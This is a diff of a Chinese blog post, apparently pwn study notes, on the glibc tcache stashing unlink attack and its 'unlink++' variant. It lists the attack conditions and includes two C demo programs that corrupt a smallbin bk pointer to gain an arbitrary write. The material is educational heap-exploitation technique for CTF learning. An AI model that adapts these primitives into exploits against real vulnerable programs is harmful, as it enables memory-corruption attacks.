-<p><code>bck-&gt;fd = bin;</code> 这句代码可以达到和 Unsortedbin Attack 类似的效果，可以将一个 main_arena 中的地址（bin）写入指定位置（bck-&gt;fd）</p>
-<h4 id="攻击条件-1"><a href="#攻击条件-1" class="headerlink" title="攻击条件"></a>攻击条件</h4><ol>
-<li><p>将一个任意地址当做堆块放入到 tcache 中。</p>
-<ul>
-<li>选定一个 n = size，释放五个大小为 n 的堆块进入到 tcache bin</li>
-<li>精心准备让一个堆块进入到 unsorted bin 中，同时修改这个堆块的 size 变为 n，再让其进入到 small bin 中。</li>
-<li>再重复构造一个同样 size 为 n 的堆块进入 small bin 后，修改该堆块的 bk 指针为 &amp;target - 0x10</li>
-<li>在 &amp;target + 8 的位置要存放有任意一个可写的地址，满足检查。</li>
-<li>使用 calloc 申请一个 size 为 n 的堆块</li>
-<li>此时 target 将被放入 tcache 中。</li>
-</ul>
-<p>注：被修改 bk 指针的堆块，fd 是不能被改变的，所以需要获取到堆地址。</p>
-</li>
-</ol>
-<h4 id="demo调试-1"><a href="#demo调试-1" class="headerlink" title="demo调试"></a>demo调试</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;inttypes.h&gt;</span><br><span class="line">static uint64_t victim[4] = {0, 0, 0, 0};</span><br><span class="line">int main(int argc, char **argv){</span><br><span class="line">    setbuf(stdout, 0);</span><br><span class="line">    setbuf(stderr, 0);</span><br><span class="line">    char *t1;</span><br><span class="line">    char *s1, *s2, *pad;</span><br><span class="line">    char *tmp;</span><br><span class="line">    tmp = malloc(0x1);</span><br><span class="line">    victim[1] = (uint64_t)(&amp;victim);</span><br><span class="line">    for(int i=0; i&lt;5; i++){</span><br><span class="line">        t1 = calloc(1, 0x50);</span><br><span class="line">        free(t1);</span><br><span class="line">    }</span><br><span class="line">    s1 = malloc(0x420);</span><br><span class="line">    pad = malloc(0x20);</span><br><span class="line">    free(s1);</span><br><span class="line">    malloc(0x3c0);</span><br><span class="line">    malloc(0x100);</span><br><span class="line">    s2 = malloc(0x420);</span><br><span class="line">    pad = malloc(0x80);</span><br><span class="line">    free(s2);</span><br><span class="line">    malloc(0x3c0);</span><br><span class="line">    malloc(0x100);</span><br><span class="line">    *(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&amp;victim)-0x10;</span><br><span class="line">    calloc(1, 0x50);</span><br><span class="line">    uint64_t *r = (uint64_t*)malloc(0x50);</span><br><span class="line">    r[0] = 0xaa;</span><br><span class="line">    r[1] = 0xbb;</span><br><span class="line">    r[2] = 0xcc;</span><br><span class="line">    r[3] = 0xdd;</span><br><span class="line">    return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-
-<p>整个程序流程：通过calloc和malloc加切割unsorted bin结合 来构造五个tcache和两个small bin 并且修改第二个small bin的bk为target -0x10的情况</p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240705004035766.png" alt="image-20240705004035766"></p>
-<p>修改smallbin的bk为target-0x10</p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240705004111423.png" alt="image-20240705004111423"></p>
-<p>然后calloc申请绕过tcache 得到堆块 然后进入stash</p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240705005246794.png" alt="image-20240705005246794"></p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240705005323767.png" alt="image-20240705005323767"></p>
-<p>然后再通过malloc取出 实现任意写的功能：</p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240705010728136.png" alt="image-20240705010728136"></p>
-<h3 id="tcache-stashing-unlink-3"><a href="#tcache-stashing-unlink-3" class="headerlink" title="tcache_stashing unlink++"></a>tcache_stashing <em>unlink++</em></h3><p>将一个任意地址当做堆块放入到 tcache 中，同时可以往一个任意地址写入一个 libc 地址。</p>
-<ul>
-<li>选定一个 n = size，释放五个大小为 n 的堆块进入到 tcache bin；</li>
-<li>精心准备让一个堆块进入到 unsorted bin 中，同时使得这个堆块的 size 变为 n，再让其进入到 small bin 中；</li>
-<li>再重复构造一个同样 size 为 n 的堆块进入 small bin 后，修改该堆块的 bk 指针为 &amp;target1 - 0x10；</li>
-<li>在 &amp;target1 + 8 的位置填写 &amp;target2 - 0x10；</li>
-<li>使用 calloc 申请一个 size 为 n 的堆块；</li>
-<li>此时 target1 将被放入 tcache 中，同时对 target2 写入一个 libc 地址。</li>
-</ul>
-<p>注：被修改 bk 指针的堆块，fd 是不能被改变的，所以需要获取到堆地址。</p>
-<p>这个整体攻击思路都没啥变化，就是再任意写的基础上 加了一个可利用的点，把target2的位置设为libc就是main_arena+？的值</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;inttypes.h&gt;</span><br><span class="line"></span><br><span class="line">static uint64_t victim[4] = {0, 0, 0, 0};</span><br><span class="line">static uint64_t victim2 = 0;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) {</span><br><span class="line">    setbuf(stdout, 0);</span><br><span class="line">    setbuf(stderr, 0);</span><br><span class="line"></span><br><span class="line">    char *t1;</span><br><span class="line">    char *s1, *s2, *pad;</span><br><span class="line">    char *tmp;</span><br><span class="line"></span><br><span class="line">    tmp = malloc(0x1);</span><br><span class="line">    victim[1] = (uint64_t)(&amp;victim2)-0x10;</span><br><span class="line"></span><br><span class="line">    for (int i=0; i&lt;5; i++) {</span><br><span class="line">        t1 = calloc(1, 0x50);</span><br><span class="line">        free(t1);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    s1 = malloc(0x420);</span><br><span class="line">    pad = malloc(0x20);</span><br><span class="line">    free(s1);</span><br><span class="line">    malloc(0x3c0);</span><br><span class="line">    malloc(0x100);</span><br><span class="line"></span><br><span class="line">    s2 = malloc(0x420);</span><br><span class="line">    pad = malloc(0x80);</span><br><span class="line">    free(s2);</span><br><span class="line">    malloc(0x3c0);</span><br><span class="line">    malloc(0x100);</span><br><span class="line">    *(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&amp;victim)-0x10;</span><br><span class="line"></span><br><span class="line">    calloc(1, 0x50);</span><br><span class="line"></span><br><span class="line">    uint64_t *r = (uint64_t*)malloc(0x50);</span><br><span class="line">    r[0] = 0xaa;</span><br><span class="line">    r[1] = 0xbb;</span><br><span class="line">    r[2] = 0xcc;</span><br><span class="line">    r[3] = 0xdd;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240705011714523.png" alt="image-20240705011714523"></p>
-<p>漏洞利用后</p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240705011738384.png" alt="image-20240705011738384"></p>
+<p><img src="/pic/house_of_pig/11.png" alt="img"></p>
 <p>既可以任意写，也可以把这个target2覆盖为libc</p>
 <p>IO_FILE 利用</p>
 ]]></content>
+      <categories>
+        <category>pwn学习</category>
+        <category>堆利用</category>
+      </categories>
       <tags>
         <tag>house_of</tag>
       </tags>
